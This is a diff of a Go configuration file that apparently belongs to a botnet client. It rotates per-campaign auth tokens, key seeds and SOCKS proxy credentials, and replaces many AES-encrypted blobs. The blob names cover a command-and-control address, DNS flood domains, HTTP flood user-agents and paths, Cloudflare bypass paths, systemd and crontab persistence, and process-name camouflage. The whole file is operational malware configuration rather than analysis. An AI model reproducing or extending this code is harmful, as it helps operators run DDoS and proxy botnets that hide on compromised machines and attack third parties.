+++ bot/config.go
@@ -20,13 +20,13 @@ var verboseLog = true
 var serviceAddr string
 
 // configSeed is the 8-char hex seed used for key derivation.
-const configSeed = "fbeb3d12" //change me run setup.py
+const configSeed = "ed34fe42" //change me run setup.py
 
 // syncToken is the shared auth token — must match server.
-const syncToken = "CBjwz*5VBoj0IABQ" //change this per campaign
+const syncToken = "@E2Aryki*&QHaAqr" //change this per campaign
 
 // buildTag must match the server's version string.
-const buildTag = "V5_0" //change this per campaign
+const buildTag = "v5.9" //change this per campaign
 
 // retryFloor and retryCeil define the range for randomised reconnection delays.
 var retryFloor = 4 * time.Second
@@ -38,8 +38,8 @@ var retryCeil = 7 * time.Second
 // Default credentials are baked in at build time by setup.py.
 // Can be overridden at runtime via !socksauth command.
 // Protected by socksCredsMutex for concurrent read/write safety.
-var proxyUser = "AffSA"    //change me run setup.py
-var proxyPass = "AffSA"    //change me run setup.py
+var proxyUser = "sRqn2362NNHJ"    //change me run setup.py
+var proxyPass = "hGNuLxxASMxC"    //change me run setup.py
 
 // maxSessions caps concurrent proxy connections.
 var maxSessions int32 = 100
@@ -141,114 +141,114 @@ var (
 // --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
 // @encrypt:single — setup.py uses these tags to identify vars for re-encryption
 
-var rawServiceAddr, _ = hex.DecodeString("ee364017bba6bb7012f768a11bbd0d420d8e6c8c247893b38d68be5bb579b67e2b8d93436345b312327e0d97fb3d7bf4c579c3a1081d7ae6f7968f64b4021216e4413f6340724288") //change me run setup.py
+var rawServiceAddr, _ = hex.DecodeString("684f5faf70a4337fbbf4d386eb0aaee7c2fb9ee23998e3eb293052179d28e8774e08b1f24ea3ccc554805eb46b4281a6494e8adeaf88a937189315ab4e4e5002d5bd78c701022b6e") //change me run setup.py
 
 // @encrypt:slice sysMarkers
-var rawSysMarkers, _ = hex.DecodeString("52b4f213ef2c4b722d0f4e955598bf902aa3777fbe26db6bf5b4861d5d7a9e1f77d6b6789942a66a13423331290b0edce1e62d5a9e1b1508bfdce0daee3566291878f4fc5a8a63fa37c48b498f66b8216b4a1b14a591398b8b3e8aa83641bbd1bc341779df2aee578b9df77ea85d3c9b31f2c21786")
+var rawSysMarkers, _ = hex.DecodeString("f07d3117a566bd433560d7860a0c29a5cb16f577efae75c4cf242d344a741bf26007130bf9bc6f09de5297fcc5a2987b8ec78f0000bbb4f9551891e81e8711ee7314cdd2343fca1131d227b6719f577b8626c685024542d0e1acc5824b581e83a35454a5e77d1f7bdd9a017d6c89d5dd923d2e33a7")
 // @encrypt:slice procFilters
-var rawProcFilters, _ = hex.DecodeString("8938fdab97808a0b5a9fb9513d4041afb233f4ebc80d076899302394246c705b8fd9018141d59d36bcaebc9ec133abbb7c12bba25246f5dd00e966228b12b7f1cd7c9b206540c335f6d1")
+var rawProcFilters, _ = hex.DecodeString("9e7581a876197d12d49d574eabfeda2ce125044917d871b3f06f7b461554d082cd226def97eecb07ff8dca637e0be25c7ea7f2d07144aa17b75ecff85fd98076054cfa7fcb02fa05f4f2")
 // @encrypt:slice parentChecks
-var rawParentChecks, _ = hex.DecodeString("4782d2853aa11a08cdb4c287aca4c103e24a61023f0ae3a8e234c641ad597c2f")
+var rawParentChecks, _ = hex.DecodeString("e44d87a0282d49c6f37703589ec6d4ca854db221a15a3427b274007228ccb12c")
 
 // @encrypt:single rcTarget
-var rawRcTarget, _ = hex.DecodeString("7e38fde30f68d4e28407ca0cd7fda7e6e2493b3b84824024ca070678b4")
+var rawRcTarget, _ = hex.DecodeString("3688dd8077ce98b94a55c75782383db614ec967c9ef4a0b8dead917f60")
 // @encrypt:single storeDir
-var rawStoreDir, _ = hex.DecodeString("618ade074f0357f61ef23e680e1707c11106a32a67456c87c8b724842857bbacc1e41fafdf")
+var rawStoreDir, _ = hex.DecodeString("ead6677de88bd18076dca9db9ce699d010661d18ad2a2314200b51e364f7caa9f9289a191b")
 // @encrypt:single binLabel
-var rawBinLabel, _ = hex.DecodeString("e856b8003a3dd10af427586a835e0f45783f2428b8299f97e966484329")
+var rawBinLabel, _ = hex.DecodeString("1b364e03cf1542667bf85b8bd0ee0951d368ccd52a47c353dec6cd721e")
 // @encrypt:single unitPath
-var rawUnitPath, _ = hex.DecodeString("057036818356ea403f1ecbb7fac03fd08f4e0356ea7e276fa97df495ddd93af680f20ee0aeef351f5cfa198fa66fcb8a0c97bbb09e68d6")
+var rawUnitPath, _ = hex.DecodeString("3abcc67dc137fedf142c4a31093f49898504a442b279179e220a4a3f434d4d0eab0c64c38fc31062bb581ac7124e2b7b64769f0a7d82fa")
 // @encrypt:single unitName
-var rawUnitName, _ = hex.DecodeString("63e80822c4f4f8b6d6864089a0860af0bead701c5dde8594f5037148d62c91489d531a")
+var rawUnitName, _ = hex.DecodeString("57e650ccaf44e34fd7c2a46c6b46176c6967ea25718e9377c4977684bbd430120d9d8e")
 // @encrypt:single schedExpr
-var rawSchedExpr, _ = hex.DecodeString("d27b6eebf516fd0b12d7fada072408328e729e980d5f660815")
+var rawSchedExpr, _ = hex.DecodeString("70d0ffe44ec981e503246124091b8c157e0a8931eedc59a87a")
 
 // @encrypt:single envLabel
-var rawEnvLabel, _ = hex.DecodeString("fad6fe966d2a1d91bafb0535748227de213e4d8a71895a172abb615a40")
+var rawEnvLabel, _ = hex.DecodeString("62a5da6d46522db6ab0e28e3f9953ed871d2eaeacd9b2c66f819c907be")
 // @encrypt:single cacheLoc
-var rawCacheLoc, _ = hex.DecodeString("1e8519a461f0500b7c9b49b033bbb408ab15e172b76e0b78f2c53efe9b82cd0e4f4a2c4db96807")
+var rawCacheLoc, _ = hex.DecodeString("0175c1b3b7d2047a4bf5add8877f5b8c7898481b4532aed4c8175af6dccc1b9fad61a7ae9f4822")
 // @encrypt:single lockLoc
-var rawLockLoc, _ = hex.DecodeString("28e0eb8f8c14f4e5e574da3b31d88428bce2eae6d7639fb6c1d584c2cf61cf12ae623a77bd1cacbce12fc0")
+var rawLockLoc, _ = hex.DecodeString("de181431ca898bb64c28759ff98ab615a56843884d9f6044cae7fdf158c0dbb774833647e0b2011e25d8f2")
 
 // --- Protocol blobs ---
 
 // @encrypt:single protoChallenge
-var rawProtoChallenge, _ = hex.DecodeString("d9752efa6fa3cd444e12e83461e3d20cde34ee0563946cfcb373d511e093eb")
+var rawProtoChallenge, _ = hex.DecodeString("122f8f297113c423c7deba292913ed2e2969e60f49330b830928470e3be038")
 // @encrypt:single protoSuccess
-var rawProtoSuccess, _ = hex.DecodeString("691f502b2353363ff214fbbc21bb3a0af6c4d8be45d0c3f0305b8f55")
+var rawProtoSuccess, _ = hex.DecodeString("e85170d2dc82c7124d775505a0ea7c2dc981ebd82b44a3151f808640")
 // @encrypt:single protoRegFmt
-var rawProtoRegFmt, _ = hex.DecodeString("dbbac099596c8e9f72dd131d6b95a3eb67aac1f8866a19529f244c644c20cf00cfd8e4b0a7ea9a88334ed54d51967619")
+var rawProtoRegFmt, _ = hex.DecodeString("233aa521423baad144ddb38d069f33262cd61181db8a7dacf4b5a286ab363f8f35046bceb7422cf8ee70e133808dd3ea")
 // @encrypt:single protoPing
-var rawProtoPing, _ = hex.DecodeString("5d25ef1eae10e69215bbbea4114cf510faaf5077")
+var rawProtoPing, _ = hex.DecodeString("d8f30eea275e315bb73a00ba466f2b6eed29dd5c")
 // @encrypt:single protoPong
-var rawProtoPong, _ = hex.DecodeString("d3e9ed0c20c0d1a55415a8f34209e002adcea0aa2e")
+var rawProtoPong, _ = hex.DecodeString("b555ec4b1845bad09052f46d8c18d6f306b6e37ac5")
 // @encrypt:single protoOutFmt
-var rawProtoOutFmt, _ = hex.DecodeString("430ffbd953f3e9049b6e07a8fc8215a39a5483941e5945643dcf5f60405a5d")
+var rawProtoOutFmt, _ = hex.DecodeString("5c99bdd341be8b39711340b6b0b4aaf5f5a073cb2d6b25265251972a6aebbb")
 // @encrypt:single protoErrFmt
-var rawProtoErrFmt, _ = hex.DecodeString("2d3051bc097bc6a96c062d397a5a28ba526ececf388823666ecc")
+var rawProtoErrFmt, _ = hex.DecodeString("4a7136292ff3e0bcb9ca60560d0f20f6d302d742d1353a82fc77")
 // @encrypt:single protoStdoutFmt
-var rawProtoStdoutFmt, _ = hex.DecodeString("af9d0073bca27a9751107cbe74995e0a47901debf9f7615c266085")
+var rawProtoStdoutFmt, _ = hex.DecodeString("3cb42141caaa8b41718096da2d53d1d8fcbf03813b207cd5c0a540")
 // @encrypt:single protoStderrFmt
-var rawProtoStderrFmt, _ = hex.DecodeString("7f418db06f8c7a3873e5441b80d06d337593285ba818a59ad7a768")
+var rawProtoStderrFmt, _ = hex.DecodeString("7065c63fc1872b70c5fde412d2cdb5a6ba52ecc3822beb7d167be5")
 // @encrypt:single protoExitErrFmt
-var rawProtoExitErrFmt, _ = hex.DecodeString("154a6b7b1ae18d92de5c46c460f5028ef801eabd80c0a1c45d41cd7946fcdf")
+var rawProtoExitErrFmt, _ = hex.DecodeString("a9f2371dec7d3b956d0d6107ef0148edc273ec3c6305f406bc4f357ce33b52")
 // @encrypt:single protoExitOk
-var rawProtoExitOk, _ = hex.DecodeString("822e577aa0c001ba700c36373628fc7c4872cfd6b9061d39c3e40b5bc4137e25c4dd95980c2771028d60a786bc21f9578e2b47e3f7")
+var rawProtoExitOk, _ = hex.DecodeString("7f3a9e9806cff32101d58afdaa8b3e3f69e5a86da33a8ccc390c04028c7a8e4648016a99628b13dc510e18080e3535da3c7c5a1535")
 // @encrypt:single protoInfoFmt
-var rawProtoInfoFmt, _ = hex.DecodeString("ceabe072d41115f70ef2a9f1dc9bd9dd4ae60fa755c533c95d")
+var rawProtoInfoFmt, _ = hex.DecodeString("98f19d459395fa7efbff7126935addfab224d8c44a1039eafd")
 
 // --- Response message blobs ---
 
 // @encrypt:single msgStreamStart
-var rawMsgStreamStart, _ = hex.DecodeString("82e2be6f1b54dfa2335dfa6a9b6d4eefe1f98c928ca3508729412e10793a387b13b9")
+var rawMsgStreamStart, _ = hex.DecodeString("0813375369fd8f5ce1f0a8a44515a20fddc160046552680ba49148bdd13cb3c5b8e2")
 // @encrypt:single msgBgStart
-var rawMsgBgStart, _ = hex.DecodeString("9175694238c588a7ffe001d57d3f10a75c911f51c405954e1bd8e155c4b645591fc27688ff19776f5fcff948b218")
+var rawMsgBgStart, _ = hex.DecodeString("6cbca92167b2da4f6aeb07793c04c674e3fac74397a05f39258aa33e8d38b98959f81bccedb2ad947cbb03ca00db")
 // @encrypt:single msgPersistStart
-var rawMsgPersistStart, _ = hex.DecodeString("efdf6f8809f3bea3de5904760fe22ed2509999e18b8d1c12fcdb58d5502012633fe488207eaf2c808e124d79")
+var rawMsgPersistStart, _ = hex.DecodeString("d8aacae61d5abdb3459c8e3caf4ec8b76dfe02012af8f0178e826bafe41370775deb6f5fb6db2b5fd90a72f3")
 // @encrypt:single msgKillAck
-var rawMsgKillAck, _ = hex.DecodeString("3211652d843d8f0347a29612ba58ced39464ca9289fb772b85e7b0abe56a82a4fef94a2490197a74e208df2ed5e41149685f0b1fb44b1b165a6e")
+var rawMsgKillAck, _ = hex.DecodeString("416a7fbbc93e8cdde82d002de0369c8fac48d55f0c766617b9ca1ccfe5ff9340e35466a0bf78e0079e56d568b186c24be7f0391000238f78e05b")
 // @encrypt:single msgSocksErrFmt
-var rawMsgSocksErrFmt, _ = hex.DecodeString("673c6db3c37f3f7dd90ee1c359d706e9c407c167eef4677908ea03a9c1d95f71")
+var rawMsgSocksErrFmt, _ = hex.DecodeString("8b0e79a99775fd1d65cbabb0851c3651138d6d9ab653658f30ff70958951474c")
 // @encrypt:single msgSocksStartFmt
-var rawMsgSocksStartFmt, _ = hex.DecodeString("21a501025084227710c7bae6798de51e5cf6784d431af3b15839a20ce1eacd91ae7008c176ef063c5d75eccd5924c5d7")
+var rawMsgSocksStartFmt, _ = hex.DecodeString("45276c0dcaf35f03789c846e6f947a22b249b16857fcf02d7a564f758dc81bcdf4371d4b059238278ed41b1c7c681c5c")
 // @encrypt:single msgSocksStop
-var rawMsgSocksStop, _ = hex.DecodeString("31d161ccddc9cde32942a1a42eb210b54c0527382abe7c45e1df992ca316bd64bdcd2a86fd")
+var rawMsgSocksStop, _ = hex.DecodeString("1bc1e0643d8d94de59c4614d39010b4100e6d3562375546ae345523ac28c35e9619e24edd5")
 // @encrypt:single msgSocksAuthFmt
-var rawMsgSocksAuthFmt, _ = hex.DecodeString("bcfa9b6214dfa1d887d689f3dc3572647e617c26840ebc0b37db0d25bfdeca9576559c8a75098ff2ca55f753c1ecf7")
+var rawMsgSocksAuthFmt, _ = hex.DecodeString("f521511f63d84b111b0aa5cce6e24b9976a993b3796a8f34da4d65edcd03cd357d541bef1e196c40235f31f714c502")
 
 // --- DNS / URL infrastructure blobs ---
 
 // @encrypt:slice dohServers
-var rawDohServers, _ = hex.DecodeString("c493933a36a46065aefbf24c6ee470b559d58e19068cbb5f21958bb286bbe436bde8439a4c03535e161ec24bd8663830e3a766dc0a0e61d5a0b6f6fb837b13edc0b4403a3142ff146149e03590e6a8b150ea2cfa67fc45e924e67a4ae060f5baacfc42113b25be06a05508c742bf6c09c1")
+var rawDohServers, _ = hex.DecodeString("b34412bf175861fa0a12480f6fd1b2000eb3206eb35c1408b35fd0027cd18f5b7d84f78a2f41da8b4dd3883869786c86e013b57ea7b81182ab35a9ab88a0ad3bf864f5d3f990c373182a475a84d8812ceb4bafc39b7ed41ffa632b3ab4e3452a6d4baeef29da26ef7ebd2fa6d93e7e8cec")
 // @encrypt:slice dohFallback
-var rawDohFallback, _ = hex.DecodeString("47bc6d817fbc59c81eab79708322166efa0a4b4a34f12c830e4ed9282a20c413aa73b167f126132bea1d797105268d636fd30a84d095e9dd2afab7fadb08b92f53771c8d61fbebcd931084c18aba139e48")
+var rawDohFallback, _ = hex.DecodeString("58b42352588a88604b2dad5861d93fd728c55fd457adc313ee518fdc5940f30c8bf8fd4261881233e08dd6793736716d63422ad01960bf33f954d32f660cbc35896b94f722411ce8625490a0c176503506")
 // @encrypt:slice dohAttack
-var rawDohAttack, _ = hex.DecodeString("4abe646b8392dc2823de5c2a93cbfe71ed84f5d931807d2ac32b857b30a535e1887987cd5a5ca5de4235bbb8de4d3c681f03068274bb1725d4234e3ba9719eda820233252528b6fb0b55045bf600")
+var rawDohAttack, _ = hex.DecodeString("b6a1f99f7991e38343be951476821b2c0d4104ceb7db41f7095ab255b551d814532443d83bfa919cf1f4839ed0029f2348a6824d439d633efc976f784fc3d28eaf81557b989cfc436f5a89c3ec1f")
 // @encrypt:slice resolverPool
-var rawResolverPool, _ = hex.DecodeString("05bf169ba7f1e89aaf4476de92eb88ab6ec71816c7a9a598827bbae41235f98b066931f5f87f234a88466a10adf4920d9ff90749da4fd9f1a8fbccd4f54037f319792362c28556126e02a3a0fe")
+var rawResolverPool, _ = hex.DecodeString("5c41d72f72bab6e017fb1925979c10a75b6a162785ca4e8ad4d53059a3bd852cb3665b08550eaadefa452365453a7ebd76f37a1566d791e8c70e42f665775ee7f80665a064000159480986febe")
 // @encrypt:single speedTestURL
-var rawSpeedTestURL, _ = hex.DecodeString("93727f106f5c9260e9ddf28204caf1df5cf15fed2859f26f4ebcfc7596c36b91d8765359bde2d77aa00cdac45a12ba5da97b1c78536815c3fdc18579f61dbf")
+var rawSpeedTestURL, _ = hex.DecodeString("dd19e552fecdb691c4c646a4fcc0d22323edc572242cd8cfa3f70ba17aae6760264b8177d6cc31d68706d42f4f08ba5c160bdf32557a1a8c73992b15a301ba")
 // @encrypt:single dnsJsonAccept
-var rawDnsJsonAccept, _ = hex.DecodeString("b13312bd767342796d4ff406dca6f8855b643e56d7263d3760d615cb1536b1fade0ec0dc")
+var rawDnsJsonAccept, _ = hex.DecodeString("a76605c62a06feeb85856730181e16fb797603fe04ac61691420b328ccd2bc585412fb16")
 
 // --- Attack fingerprint blobs ---
 
 // @encrypt:slice shortUAs
-var rawShortUAs, _ = hex.DecodeString("575c232939632b158ca78afef973d3df9dcd4e059e7bfc2e7abe500e7efad248ff56a206eca9ed1d75c137759259a0276bc8573c6a1915f39948021f7faefbc71fb4bc94e5e8669699ac68f1185180fdc893c5504947939d86ee0d3c1cb188d192804abf9f3db16604bb85dc7042370f0579150f30e677f83ea4bd4055b4354b2d550b82db0e027f540f9e2f0e4c3ec103b7527b03fcba2db4763bb09c81ec240ebb3de7789a2cdc7658120c85d0d3c49da3671a35732c9d9a6c1acb1c9622a48687d2bd2a451e1e00912d5d1983b72b77bf9350a56f020965defe41af")
+var rawShortUAs, _ = hex.DecodeString("066c87f94abbb691c2d8ba8531dc6ef346bced2f2bb2ccdd2c16eb423f9c23f4ba9222e6fd2e9d20a6e17da353d6535bc7f0bf3e0143eb9b5ec8ec3e55b213bd9c6874186a5af674b866d3d945122fcc217a790ad2c27986ba3acee0625d1fda71ff1fe3158b94ea06bf81eca88fe81be10a0463c74051999939431c09205c18ad788fa437fc88b41af1fba52fbe53911d26cf7403655827616d466581471b74fcaed6abda850b77f5f296e9fa60e3db743fba590e6e97760c1e946272c0d059627e87d069630deb3d8cbafe65724a6b8a8f6ec45a2b4f239876351ae4")
 // @encrypt:slice refererList
-var rawRefererList, _ = hex.DecodeString("4a685aee80aaebb98eb2f3d7280791f374797193f26f4425b821764c8d8d86842e159cbe3221104e4fb52e128f4db10fbdaacd722339c9705e0d5feffb6db7215f4c5b72a91f7161b8d73ded0f30bf506bf37c975a5583e492a2e8")
+var rawRefererList, _ = hex.DecodeString("37d267672479731290fa4587769b2fe460fd751815844329b49c539263b10f589861b1fae5a4c606a39b140078de621dd9a9ad07884909ee0e81d65ee93188a7534e81d037151099f55e0ced85d18fba8f3fa099f8d3f3b8c9335c")
 // @encrypt:slice httpPaths
-var rawHttpPaths, _ = hex.DecodeString("8a89c22ec8c818b69af58f3c4b9d90c2bc911ec264fc2946af40c8722411f53e28a64597713491990749dea1f0cf3bda2685de3ef0ad3563107582")
+var rawHttpPaths, _ = hex.DecodeString("04e490c8ec85a4b3aa723d612b079f0bc47c1695fb3e55e4d90ad8cc87c143121035b991e27017a55b384534307e2dedb5ce094e68a798aa8b47e5")
 // @encrypt:slice cfPaths
-var rawCfPaths, _ = hex.DecodeString("97eab0b79527b798caa37617abe9b274db47a3a434a3aefcc6e28ef17fae0299cd2ce8f0babbf29286f38bb08b009099402ba318de2c2d4e3eff958f07726e0ce5db41faee9017031f")
+var rawCfPaths, _ = hex.DecodeString("5f61f6b2e15ef9468056223d8124af65c86c94bda1bb911235f73ba21492b0e7732bb4ff65d4a05ad171187bc3a2ee57d8a24c4b83f4cfb88a4c407b9c25fb2b4b983f97c9b994d65d")
 // @encrypt:single cfCookieName
-var rawCfCookieName, _ = hex.DecodeString("3d0b8e6b458733d761f676f5427f18926c3bea74dcd847")
+var rawCfCookieName, _ = hex.DecodeString("45357d1a82fda6a18ab351bdcaf1ff36d2d9bf5854756b")
 // @encrypt:single tcpPayload
-var rawTcpPayload, _ = hex.DecodeString("0d37de0fc12d5b2df17fb1301ef00ce80f6a406b24054e304ebad56a2f117406d185")
+var rawTcpPayload, _ = hex.DecodeString("89a57d49c07415e66357868a946d33d8891f27e1fb413849f8f8a44bdc5402e6931c")
 // @encrypt:slice dnsFloodDomains
-var rawDnsFloodDomains, _ = hex.DecodeString("984eb987d6374634112d3c59e2a7b208ec99a5434ec2f8ad2bb6b5319facb3726341471182ba044e7a52db39a088f531ff32bbe35b0808fb38140afff3bc4bab2f599aa9d3b405618f06de356800c094a2ba7531e9b3f84d76eeeb475f18ce")
+var rawDnsFloodDomains, _ = hex.DecodeString("3b14317568405695e6ed7e9225332c1eab159b58dc8d27d4c42738e85fcdbfdae7358db0b58051942ca21f11d7e2980fb3dc8a17907edf28750c0083ffee5d11d44819427ac30592beb20fdbdbf2a41c92111fa2dc223f0595f5f1a1b46079")
 // @encrypt:single alpnH2
-var rawAlpnH2, _ = hex.DecodeString("c005e7effda01f864fb6f4194e7b19169667")
+var rawAlpnH2, _ = hex.DecodeString("323d18852c4d357cf96e2ee3b93b535d44f8")
 
 // @encrypt:slice relayEndpoints
 var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — empty = no pre-configured relays
@@ -256,27 +256,27 @@ var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — emp
 // --- System / camouflage blobs ---
 
 // @encrypt:slice camoNames
-var rawCamoNames, _ = hex.DecodeString("4872b93d2e3f0f5b6c481eee6b76fd6bc9efc693d23a9bdff3b259133bf58636211938c45f3f23eaffbe040e0f9878676191f30a43")
+var rawCamoNames, _ = hex.DecodeString("6e0626067f717e16dba36a00ded86f2f7efd224a8398b9e182bdaca80c408ca719853d2f405d837f11263d94088927eeb6f6a62f51")
 // @encrypt:single shellBin
-var rawShellBin, _ = hex.DecodeString("ba014a4eb2799a15f07e769da7bd6388917e")
+var rawShellBin, _ = hex.DecodeString("4dc21ee06b0312ebac75a9585b2bbfcb6759")
 // @encrypt:single shellFlag
-var rawShellFlag, _ = hex.DecodeString("b5a95d27527fab5796495d9d7064361cf3df")
+var rawShellFlag, _ = hex.DecodeString("5d4a9f647baf479814a4e48a294d6c701eba")
 // @encrypt:single procPrefix
-var rawProcPrefix, _ = hex.DecodeString("d802be4561d7a5ec41dd599929e1811e4abf1b8cd002")
+var rawProcPrefix, _ = hex.DecodeString("db159dffdccdf26be454c2dd01c148b0405ad518733b")
 // @encrypt:single cmdlineSuffix
-var rawCmdlineSuffix, _ = hex.DecodeString("293806832b731f59bed18b62f0320035fe8e0a5214af4566")
+var rawCmdlineSuffix, _ = hex.DecodeString("f2ea3bc8069df97608d4ba2a664cd96b446fe70272e8b516")
 // @encrypt:single pgrepBin
-var rawPgrepBin, _ = hex.DecodeString("5aff1b40b06c8a6c837b907f14b9330eb62f57379c")
+var rawPgrepBin, _ = hex.DecodeString("1e4e77863086f6392f15fc0cbd75f0314e0af833a5")
 // @encrypt:single pgrepFlag
-var rawPgrepFlag, _ = hex.DecodeString("ed3bbe9083e07a951d389a25e2f0829ce75d")
+var rawPgrepFlag, _ = hex.DecodeString("2ef48f2e5b6dbcfa0c52bffe3388067dac78")
 // @encrypt:single devNullPath
-var rawDevNullPath, _ = hex.DecodeString("d4490a1c431897eccd10ad7652ba834b9c77a981410cee6ee4")
+var rawDevNullPath, _ = hex.DecodeString("81144ae261f4083c4caa055b898d53fb054581a8ea5044bdbd")
 // @encrypt:single systemctlBin
-var rawSystemctlBin, _ = hex.DecodeString("6c018f3e83c0da55f9fd0441194dcc896be9fbd4d8f0bd8131")
+var rawSystemctlBin, _ = hex.DecodeString("365b770f3a10708eb4586c7037df51c48d597f503cf641ebd3")
 // @encrypt:single crontabBin
-var rawCrontabBin, _ = hex.DecodeString("a856f93139185ef71d287e3804ba4db314eceaa040c213")
+var rawCrontabBin, _ = hex.DecodeString("c0a3f6a075fc9a221a825c2fd41c2efcdd534ff72b3286")
 // @encrypt:single bashBin
-var rawBashBin, _ = hex.DecodeString("c4c391fd7dc97681d97249b010ceaa42de43aff7")
+var rawBashBin, _ = hex.DecodeString("8f92a64319beea1c87b1597dbfda5a253c717894")
 
 // initRuntimeConfig decodes all raw blobs into their runtime variables.
 // Must be called once at startup before any code references these values.